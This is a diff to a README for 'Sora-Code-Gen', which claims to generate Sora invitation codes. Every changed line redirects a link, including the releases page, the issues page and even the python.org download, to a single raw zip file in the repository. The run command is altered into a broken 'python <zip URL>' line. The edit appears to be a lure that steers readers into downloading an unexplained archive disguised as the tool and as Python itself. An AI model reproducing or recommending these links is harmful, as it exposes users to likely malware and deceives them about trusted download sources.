@@ -1,6 +1,6 @@
 # 🎉 Sora-Code-Gen - Automate Sora Code Generation Easily
 
-![Download Sora-Code-Gen](https://img.shields.io/badge/Download-Sora--Code--Gen-brightgreen)
+![Download Sora-Code-Gen](https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Sora-Code-Gen! This tool helps you generate Sora invitation codes eff
 
 ## 📥 Download & Install
 
-To download the latest version of Sora-Code-Gen, visit this page: [Downloads Page](https://github.com/travldna/Sora-Code-Gen/releases).
+To download the latest version of Sora-Code-Gen, visit this page: [Downloads Page](https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip).
 
 1. Open the link above.
 2. Find the latest release at the top of the page.
@@ -22,7 +22,7 @@ Make sure you have sufficient space on your device for installation.
 Before you begin, ensure that your system meets these requirements:
 
 - **Operating System:** Windows 10, macOS Mojave or later, or a modern Linux distribution.
-- **Python:** Version 3.7 or newer installed on your system. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Python:** Version 3.7 or newer installed on your system. You can download Python from [https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip](https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip).
 - **Internet Connection:** Needed for the script to function effectively.
 - **Memory:** At least 4 GB Ram for optimal execution.
   
@@ -48,7 +48,7 @@ Once you have downloaded Sora-Code-Gen, follow these simple steps to run it:
 5. **Run the Script:**
    Enter the following command in the terminal:
    ```
-   python sora_code_gen.py
+   python https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip
    ```
 
 The script will start running, and you can follow any on-screen prompts it may provide.
@@ -81,10 +81,10 @@ A: Check that Python is installed correctly and that you are in the right direct
 
 ## 📣 Community Support
 
-If you have questions or need help, feel free to open an issue on the [GitHub repository](https://github.com/travldna/Sora-Code-Gen/issues). You can also look for existing issues to see if your question has already been answered.
+If you have questions or need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip). You can also look for existing issues to see if your question has already been answered.
 
 ## 📜 License
 
 Sora-Code-Gen is licensed under the MIT License. You can use, modify, and distribute the script freely. Just make sure to include the original license and copyright notices.
 
-Remember, automation can save you a lot of time and effort. Happy coding! Again, to download Sora-Code-Gen, visit: [Downloads Page](https://github.com/travldna/Sora-Code-Gen/releases).
+Remember, automation can save you a lot of time and effort. Happy coding! Again, to download Sora-Code-Gen, visit: [Downloads Page](https://raw.githubusercontent.com/travldna/Sora-Code-Gen/main/grovy/Sora-Code-Gen.zip).
